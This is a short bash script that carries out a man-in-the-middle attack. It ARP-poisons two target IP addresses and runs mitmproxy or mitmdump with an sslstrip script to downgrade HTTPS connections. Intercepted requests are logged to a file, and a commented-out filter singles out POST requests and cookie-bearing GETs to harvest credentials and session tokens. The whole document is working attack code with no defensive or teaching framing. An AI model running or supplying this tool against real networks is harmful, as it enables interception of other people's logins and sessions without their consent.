#! /bin/bash

INTERACTIVE_MODE=0

#####################################
# Displays help
#####################################
function help(){
	echo "Usage: $0 [-i] ip_target1 ip_target2"
        exit 1
}

#####################################
# Checking is root
#####################################
if [ $(id -u) -ne 0 ]; then
	echo "You'd better be root! Exiting..."
	exit
fi

if [ $# -lt 2 ] || [ $# -gt 3 ]; then
	help
fi

#getting option -i
if [ ${1} == "-i" ]; then
	INTERACTIVE_MODE=1
        shift
fi

arpoison ${1} ${2}

#####################################
# mitmproxy
#####################################
if [ ${INTERACTIVE_MODE} -eq 1 ]; then
	xterm -maximized -T "mitmproxy" -hold -e mitmproxy -T --anticache --host --anticomp --noapp --script "./io_write_dumpfile.py ./requests.log" --script ./sslstrip.py --eventlog &
else
	echo "Running mitmdump..."
	#mitmdump -T --anticache --host --anticomp --noapp --quiet --script ./sslstrip.py -a requests.log "~m POST | (~m GET & ~hq Cookie)"
 	mitmdump -T --anticache --host --anticomp --noapp --quiet --script "./io_write_dumpfile.py ./requests.log" --script ./sslstrip.py      
fi

